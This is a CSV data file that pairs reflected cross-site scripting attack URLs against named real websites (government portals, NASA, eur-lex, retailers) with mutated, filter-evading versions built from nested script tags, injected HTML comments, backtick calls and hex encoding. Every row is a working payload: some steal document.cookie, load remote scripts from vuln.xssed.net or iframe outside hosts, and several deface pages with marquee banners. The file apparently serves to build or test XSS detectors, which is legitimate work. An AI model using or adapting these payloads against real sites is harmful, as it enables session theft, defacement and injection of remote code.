Payloads,Original
http://www.internet.gouv.fr/recherche/?recherche=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thi<br>rdparty/scripts/python5.js<!--Comment-->%3e%3cscript%20src=http://vuln.xssed.net/thi<br<!--Comment-->>rdparty/scripts/python5.js%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e&amp;soumettre=rechercher&amp;nombrereponseparpage=10,http://www.internet.gouv.fr/recherche/?recherche=%22%3e'%3e%3cscript%20src=http://vuln.xssed.net/thi<br>rdparty/scripts/python5.js%3e%3c/script%3e&amp;soumettre=rechercher&amp;nombrereponseparpage=10
http://www.ieice.org/ken/program/index.php?tgs_regid=469a50ccaec5cc76bd3fb27807d357eee010ddb2c32a74c<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>55246123937acbe7a&amp;cmd=show_form&amp;form_code=kacp&amp;layout=&amp;lang=%22%3e%27%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%61%<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%2<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>9%29%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%0a,http://www.ieice.org/ken/program/index.php?tgs_regid=469a50ccaec5cc76bd3fb27807d357eee010ddb2c32a74c<br>55246123937acbe7a&amp;cmd=show_form&amp;form_code=kacp&amp;layout=&amp;lang=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%<br>6c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%2<br>9%29%3c%2f%73%63%72%69%70%74%3e%0a
http://msnnl.starlounge.com/article.cfm?objectid=10654&amp;imagenr=%22%3e%3cbody%20onload=%22alert`1`%22<br<!--Comment-->>%3e%3cbody%20onload=%22alert`1`%22<br<!--Comment-->>%3e%3cbody%20onload=%22alert`1`%22<br<!--Comment-->>%3e%3cbody%20onload=%22alert`1`%22<br<!--Comment-->>%3e,http://msnnl.starlounge.com/article.cfm?objectid=10654&amp;imagenr=%22%3e%3cbody%20onload=%22alert(1)%22<br>%3e
http://www.amex.com/quickquote/error.jsp?fldmessage=%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22xss%22`%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.amex.com/quickquote/error.jsp?fldmessage=%3cscript%3ealert(%22xss%22)%3c/script%3e
http://www.rossallentrucks.com.au/igallery/login.asp?folder=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;<!--Comment-->script&gt;alert`document.cookie`&lt;/script<br><!--Comment-->&gt;&lt;/script<br<!--Comment-->>&gt;&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->marquee&gt;&lt;<!--Comment-->h1&gt;&lt;h1<!--Comment-->&gt;by+narcoticxs&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/h1&gt;&lt;<!--Comment-->/marquee&gt;&lt;<!--Comment-->/marquee&gt;,http://www.rossallentrucks.com.au/igallery/login.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.optisu.net/shop/default.asp?gb=urun&amp;id=293&amp;ortak=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22backdoor%22`%<br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment-->>3c/script%3e,http://www.optisu.net/shop/default.asp?gb=urun&amp;id=293&amp;ortak=%22%3e%3cscript%3ealert(%22backdoor%22)%<br>3c/script%3e
http://mtm.kaeferpiloten.de/cms/index.php?page=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`document.cookie`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e<br<!--Comment-->><br<!--Comment-->>%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->marquee%3e%3ch1<!--Comment-->%3e%3ch1<!--Comment-->%3ebackdoor%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c<!--Comment-->/marquee%3e%3c/marquee<!--Comment-->%3e,http://mtm.kaeferpiloten.de/cms/index.php?page=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e<br>%3e%3cmarquee%3e%3ch1%3ebackdoor%3c/h1%3e%3c/marquee%3e
http://www.amxku.net/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%61%6<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%29%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%0a&amp;page=1,http://www.amxku.net/?action=index&amp;setdate=200703&amp;setday=21%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6<br>c%65%72%74%28%53%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%38%38%2c%38%33%2c%38%33%29<br>%29%3c%2f%73%63%72%69%70%74%3e%0a&amp;page=1
http://apps.limewire.org/login.php?returnto=%22%3e%3c<!--Comment-->iframe%20src=http://google.com%3e%3ciframe%20src=http://google.com<!--Comment-->%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%<br<!--Comment-->><br<!--Comment-->>3cscript%3ealert`document.cookie`;%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,http://apps.limewire.org/login.php?returnto=%22%3e%3ciframe%20src=http://google.com%3e%3c/iframe%3e%<br>3cscript%3ealert(document.cookie);%3c/script%3e
http://www4.airnet.ne.jp/ohozono/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%28%2<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>7ins%20-%20unkn0wn.eu%27%29%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e,http://www4.airnet.ne.jp/ohozono/cgi-bin/newsboard/newsboard.cgi?num=%3e%22%3e%3cscript%3ealert%28%2<br>7ins%20-%20unkn0wn.eu%27%29%3c%2fscript%3e
http://www.taqa.com.sa/arabic/cmain.asp?pv=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`document.cookie`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%3e%<br<!--Comment-->><br<!--Comment-->>3cmarquee%3e%3ch1<!--Comment-->%3e%3c<!--Comment-->h1%3emeloulisi%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c<!--Comment-->/marquee%3e,http://www.taqa.com.sa/arabic/cmain.asp?pv=%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%3e%<br>3cmarquee%3e%3ch1%3emeloulisi%3c/h1%3e%3c/marquee%3e
http://www.pizzahut.de/de/newsletter/index?email=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert%281%29%3b%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c<!--Comment-->%2fscript%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3e%3c%2fscript<!--Comment-->%3egee<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>k%40nerd.com&amp;anmelden.x=5&amp;anmelden.y=5,http://www.pizzahut.de/de/newsletter/index?email=%22%3e%3cscript%3ealert%281%29%3b%3c%2fscript%3egee<br>k%40nerd.com&amp;anmelden.x=5&amp;anmelden.y=5
http://gsk-clinicalstudyregister.com/quick-search.jsp?letterrange=0-9&amp;phase=all&amp;studytype=all&amp;popula<br<!--Comment-->><br<!--Comment-->>tion=all&amp;marketing=yes&amp;type=compound}%3c<!--Comment-->/style%3e%3c<!--Comment-->/style%3e%3cscript<!--Comment-->%3e%3c<!--Comment-->script%3ea=eval;b=alert;a`b`/xss/.source``;%3c<!--Comment-->/s<br>cript%3e%3c/s<br<!--Comment-->>cript%3e%27%22%3e%3c<!--Comment-->marquee%3e%3cmarquee<!--Comment-->%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3exss%20by%20xylitol%3c<!--Comment-->/h1%3e%3c/h1<!--Comment-->%3e%3c/marquee<!--Comment-->%3e%3c/marquee<!--Comment-->%3e,http://gsk-clinicalstudyregister.com/quick-search.jsp?letterrange=0-9&amp;phase=all&amp;studytype=all&amp;popula<br>tion=all&amp;marketing=yes&amp;type=compound}%3c/style%3e%3cscript%3ea=eval;b=alert;a(b(/xss/.source));%3c/s<br>cript%3e%27%22%3e%3cmarquee%3e%3ch1%3exss%20by%20xylitol%3c/h1%3e%3c/marquee%3e
http://bg.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment--><br<!--Comment--<!--Comment-->><br<!--Comment--><!--Comment--><br<!--Comment--<!--Comment-->><br<!-<!--Comment-->-Comment--><br<!--Comment--><!--Comment--><br<!-<!--Comment-->-Comment-->><br<!--Comment--<!--Comment-->><br<!-<!--Comment-->-Comment--><br<!--Comment--<!--Comment-->><br<!--Comment--<!--Comment-->><br<!--Comment--><!--Comment--><br<!--Comment--><!--Comment--><br<!--Comment--<!--Comment-->><br<!--Comment--><!--Comment-->>s.html%20%3c,http://bg.boincstats.com/stats/project_graph.php?pr='%3e%22%3e%3ciframe%20src=http://kusomiso.com/xs<br>s.html%20%3c
http://www.bayanozel.com/odeme.asp?defurunid=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22document.cookie%22`%3c/scrip<br<!--Comment-->>t%3e%3c/scrip<br<!--Comment-->>t%3e%3c/scrip<br>t<!--Comment-->%3e%3c/scrip<br>t<!--Comment-->%3e,http://www.bayanozel.com/odeme.asp?defurunid=%22%3e%3cscript%3ealert(%22document.cookie%22)%3c/scrip<br>t%3e
http://ms117.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`%22maxwel%22`%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e,http://ms117.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e
https://myaccount.curbas.hol.gr/curbas-iframe-view.cgi?action=%22%3e'%3e%3c<!--Comment-->script%20src=http://vuln.<br>xssed.net/thirdparty/scripts/python5.js%3e%3c<!--Comment-->script%20src=http://vuln.<br>xssed.net/thirdparty/scripts/python5.js%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e,https://myaccount.curbas.hol.gr/curbas-iframe-view.cgi?action=%22%3e'%3e%3cscript%20src=http://vuln.<br>xssed.net/thirdparty/scripts/python5.js%3e%3c/script%3e
http://www.hashimoto-selbsthilfe.de/index.php?page=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;&gt;&lt;marque<br<!--Comment-->>e&gt;&lt;marque<br<!--Comment-->>e&gt;&lt;h1<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;backdoor&lt;<!--Comment-->/h1&gt;&lt;/h1<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;&lt;/marquee<!--Comment-->&gt;,http://www.hashimoto-selbsthilfe.de/index.php?page=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script&gt;&gt;&lt;marque<br>e&gt;&lt;h1&gt;backdoor&lt;/h1&gt;&lt;/marquee&gt;
http://eur-lex.europa.eu/joindex.do?ihmlang=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`123`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e,http://eur-lex.europa.eu/joindex.do?ihmlang=%22%3e%3cscript%3ealert(123)%3c/script%3e
https://portailrh.ac-bordeaux.fr/login/ct_logon_mixte.jsp?ct_orig_url=%2farena%2f%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert%281337%29%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3c<!--Comment-->iframe%20src=http://xssed.com%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3ciframe%20src=http://xssed.com<!--Comment-->%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e%3c<!--Comment-->/iframe%3e,https://portailrh.ac-bordeaux.fr/login/ct_logon_mixte.jsp?ct_orig_url=%2farena%2f%22%3e%3cscript%3ealert%281337%29%3c/script%3e%3ciframe%20src=http://xssed.com%3e%3c/iframe%3e
http://marsdata1.jpl.nasa.gov/gallery/photocontest/index.cfm?showheader=&quot;&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;&lt;script<!--Comment-->&gt;alert`&quot;maxwel&quot;`&lt;/s<br<!--Comment-->>cript&gt;&lt;/s<br<!--Comment-->>cript&gt;&lt;/s<br>cript<!--Comment-->&gt;&lt;/s<br>cript<!--Comment-->&gt;,http://marsdata1.jpl.nasa.gov/gallery/photocontest/index.cfm?showheader=&quot;&gt;&lt;script&gt;alert(&quot;maxwel&quot;)&lt;/s<br>cript&gt;
"http://decs.bvs.br/cgi-bin/wxis1660.exe/decsserver/?isisscript=../cgi-bin/decsserver/decsserver.xis&amp;<br<!--Comment-->><br<!--Comment-->>task=exact_term&amp;previous_page=homepage&amp;interface_language=i&amp;search_language=i&amp;search_exp=genes,%20sr<br<!--Comment-->><br<!--Comment-->>y%22%3e%3cscript<!--Comment-->%3e%3cscript<!--Comment-->%3ealert`document.cookie`%3c<!--Comment-->/script%3e%3c/script<!--Comment-->%3e%27%22%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->marquee%3e%3c<!--Comment-->h1%3e%3ch1<!--Comment-->%3ehhhhh%3c/h1<!--Comment-->%3e%3c/h1<!--Comment-->%3e%3<br<!--Comment-->><br<!--Comment-->>c/marquee%3e","http://decs.bvs.br/cgi-bin/wxis1660.exe/decsserver/?isisscript=../cgi-bin/decsserver/decsserver.xis&amp;<br>task=exact_term&amp;previous_page=homepage&amp;interface_language=i&amp;search_language=i&amp;search_exp=genes,%20sr<br>y%22%3e%3cscript%3ealert(document.cookie)%3c/script%3e%27%22%3e%3cmarquee%3e%3ch1%3ehhhhh%3c/h1%3e%3<br>c/marquee%3e"
http://www.bsas.gov.ar/avisos/?buscando=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`/xss/`%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e%3c/script<!--Comment-->%3e,http://www.bsas.gov.ar/avisos/?buscando=%22%3e%3cscript%3ealert(/xss/)%3c/script%3e
http://www.edu.cn/homepage/jiao_yu_zi_yuan/list_cernet.php?listid=&gt;&quot;&gt;&lt;script%20%0a%0d<!--Comment-->&gt;&lt;<!--Comment-->script%20%0a%0d&gt;alert`/=xssbyd<br<!--Comment-->><br<!--Comment-->>t=/`%3b&lt;<!--Comment-->/script&gt;&lt;<!--Comment-->/script&gt;,http://www.edu.cn/homepage/jiao_yu_zi_yuan/list_cernet.php?listid=&gt;&quot;&gt;&lt;script%20%0a%0d&gt;alert(/=xssbyd<br>t=/)%3b&lt;/script&gt;
http://hotphpscript.com/signinform.php?msg=%22%3e%27%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c<!--Comment-->%73%63%72%69%70%74%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%3c%73%63%72%69%70%74<!--Comment-->%3e%61%6c%65%72%74%28%53<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2<br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment--><br<!--Comment-->>c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c%2f%73%63%72%69%70%74<!--Comment-->%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%3c<!--Comment-->%2f%73%63%72%69%70%74%3e%0a,http://hotphpscript.com/signinform.php?msg=%22%3e%27%3e%3c%73%63%72%69%70%74%3e%61%6c%65%72%74%28%53<br>%74%72%69%6e%67%2e%66%72%6f%6d%43%68%61%72%43%6f%64%65%28%36%36%2c%31%32%31%2c%33%32%2c%31%30%37%2c%<br>31%31%37%2c%31%31%35%2c%31%31%31%2c%31%30%39%2c%31%30%35%2c%31%31%35%2c%31%31%31%2c%34%36%2c%39%39%2<br>c%31%31%31%2c%31%30%39%29%29%3c%2f%73%63%72%69%70%74%3e%0a
http://www.badiraguato.gob.mx/galeria/folderview.asp?folder=&quot;&gt;&lt;<!--Comment-->script&gt;&lt;script<!--Comment-->&gt;alert`document.cookie`&lt;/script<br><!--Comment-->&gt;&lt;<!--Comment-->/script<br>&gt;&gt;&lt;marquee<!--Comment-->&gt;&lt;marquee<!--Comment-->&gt;&lt;h1<!--Comment-->&gt;&lt;<!--Comment-->h1&gt;by+narcoticxs&lt;/h1<!--Comment-->&gt;&lt;<!--Comment-->/h1&gt;&lt;/marquee<!--Comment-->&gt;&lt;<!--Comment-->/marquee&gt;,http://www.badiraguato.gob.mx/galeria/folderview.asp?folder=&quot;&gt;&lt;script&gt;alert(document.cookie)&lt;/script<br>&gt;&gt;&lt;marquee&gt;&lt;h1&gt;by+narcoticxs&lt;/h1&gt;&lt;/marquee&gt;
http://www.bangbros.com/t1/pps=bbonet/updates?o=v&amp;page=%3cscript%20src=http://vuln.xssed.net/thirdpa<br<!--Comment-->>rty/scripts/ckers.org.js%3e%3cscript%20src=http://vuln.xssed.net/thirdpa<br<!--Comment-->>rty/scripts/ckers.org.js%3e%3cscript%20src=http://vuln.xssed.net/thirdpa<br>rty/scripts/ckers.org.js<!--Comment-->%3e%3cscript%20src=http://vuln.xssed.net/thirdpa<br>rty/scripts/ckers.org.js<!--Comment-->%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e%3c<!--Comment-->/script%3e&amp;menu=111-222-1933bbq@bbq.bbq&amp;site=assparade,http://www.bangbros.com/t1/pps=bbonet/updates?o=v&amp;page=%3cscript%20src=http://vuln.xssed.net/thirdpa<br>rty/scripts/ckers.org.js%3e%3c/script%3e&amp;menu=111-222-1933bbq@bbq.bbq&amp;site=assparade
http://ms132.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3e%3c<!--Comment-->script%3ealert`%22maxwel%22`%3c/scri<br<!--Comment-->>pt%3e%3c/scri<br<!--Comment-->>pt%3e%3c<!--Comment-->/scri<br>pt%3e%3c<!--Comment-->/scri<br>pt%3e,http://ms132.mysearch.com/search/ggweb.jhtml?searchfor=%22%3e%3cscript%3ealert(%22maxwel%22)%3c/scri<br>pt%3e
